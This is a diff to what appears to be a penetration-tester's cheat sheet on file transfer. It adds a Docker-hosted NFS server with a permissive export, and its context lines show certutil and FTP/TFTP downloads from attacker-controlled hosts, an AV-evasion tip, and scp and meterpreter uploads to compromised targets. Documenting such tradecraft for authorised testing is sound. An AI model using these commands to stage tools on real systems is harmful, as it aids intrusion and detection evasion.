@@ -246,6 +246,41 @@ mkdir <TFTPFOLDER>
 atftpd --daemon --port <PORT> <TFTPFOLDER>
 ```
 
+###### [Linux] NFS server
+
+The [`docker-nfs-server`](https://github.com/ehough/docker-nfs-server) project
+can be used to host a `NFS` server in a docker container and expose the `NFS`
+server on the host.
+
+If `AppArmor` is installed and enabled on the host running docker (can be
+checked with `sudo aa-status`),
+[the documented additional steps](https://github.com/ehough/docker-nfs-server/blob/develop/doc/feature/apparmor.md)
+must be followed to start the NFS server.
+
+```bash
+# Export example allowing the specified IP / CIDR range to mount <NFS_SERVER>:/nfs/
+# The directory exported correspond to a directory inside the container (and not a directory on the host itself).
+echo '/nfs/ <IP | CIDR>(rw,insecure,no_subtree_check,fsid=0,no_root_squash)' > <HOST_PATH_EXPORTS_FILE>
+
+# Launch the docker container erichough/nfs-server and expose the NFS server on the host TCP port 2049.
+docker run                                            \
+  -v <HOST_SHARED_FOLDER>:/nfs                        \
+  -v <HOST_PATH_EXPORTS_FILE>:/etc/exports:rw         \
+  -e NFS_LOG_LEVEL=DEBUG                              \
+  --cap-add SYS_ADMIN                                 \
+  -p 2049:2049                                        \
+  erichough/nfs-server
+```
+
+The `mount` utility can then be used to validate that the `NFS` directory is
+available:
+
+```bash
+# If using NFS 4.x+ versions, the NFS directory should not be specified (i.e <HOST_IP>:/ should be used, and not <HOST_IP>:/nfs).
+
+mount -o vers=4.2 -t nfs <HOST_IP>:/ /mnt/test2
+```
+
 ###### [Windows] PowerShell HTTP PUT request
 
 The PowerShell cmdlets `Invoke-WebRequest` and `Invoke-RestMethod` can be used
@@ -287,14 +322,14 @@ Invoke-SimulateKeyboard $FilePath
 
 ### Client side / file receiver
 
-The following tools can be used to download file from a server client side.  
+The following tools can be used to download file from a server client side.
 
 File transfer is easier on Linux machines as `wget`, `curl` or `netcat` are
-often packaged with the operating system distribution.  
+often packaged with the operating system distribution.
 
 On Windows machines, the process is usually not as straight forward but
 multiples methods can still be used. Transferring the `netcat` utility may
-simplify the subsequent files transfer.  
+simplify the subsequent files transfer.
 
 ###### LOLBINS
 
@@ -316,7 +351,7 @@ find / -type f -executable -exec sh -c "file -i '{}' | grep -q 'x-executable; ch
 ###### [Linux / Windows] echo & base64 encoding
 
 The Linux built-ins `echo` and `base64` and the Windows CMD built-ins `echo` and
-`certutil` can be used to easily transfer files on Linux / Windows systems.   
+`certutil` can be used to easily transfer files on Linux / Windows systems.
 
 Encode the file to be transferred using base64 server-side, copy it to the
 clipboard buffer, and decode it into a file client-side.
@@ -578,7 +613,7 @@ files from a remote webserver by specifying an `URL`.
 
 Note that the usage of `CertUtil` is monitored by most `Endpoint Detection and
 Response` products and downloads through `CertUtil` may generate detection
-alerts.  
+alerts.
 
 ```
 certutil -urlcache -split -f http://<IP>:<PORT>/<FILE> <FILENAME>
@@ -633,7 +668,7 @@ echo bye >> ftp.txt
 ftp -v -n -s:ftp.txt
 ```
 
-In case of AV errors while trying to download a binary, omit the exe extension.  
+In case of AV errors while trying to download a binary, omit the exe extension.
 
 ###### [Windows XP & 2003] TFTP
 
@@ -643,7 +678,7 @@ therefore it lacks most of the advanced features offered by more robust file
 transfer protocols.
 TFTP only reads and writes files from or to a remote server. It cannot list,
 delete, or rename files or directories and it has no provisions for user
-authentication.  
+authentication.
 
 Windows operating systems up to Windows XP and 2003 contain a TFTP
 client, by default. In Windows 7, 2008, and above, this tool needs to be
@@ -657,7 +692,7 @@ tftp -i <SERVERIP> GET <FILENAME>
 
 The Linux `Secure Copy` utility can be used to transfer files over `SSH` and
 can notably be used to retrieve and upload files from a compromised target
-exposing a SSH service.  
+exposing a SSH service.
 
 ```
 # Download remote <FILENAME> from <HOSTNAME | IP>
@@ -707,7 +742,7 @@ meterpreter> upload -r <DIRECTORY>
 The following Python code extends the Python `SimpleHTTPServer` module to
 process HTTP PUT request and store, in the directory the script was started,
 the PUT request body content as a file. The filename is specified in the URL
-requested.   
+requested.
 
 Original author: Floating Octothorpe,
 `https://f-o.org.uk/2017/receiving-files-over-http-with-python.html`.
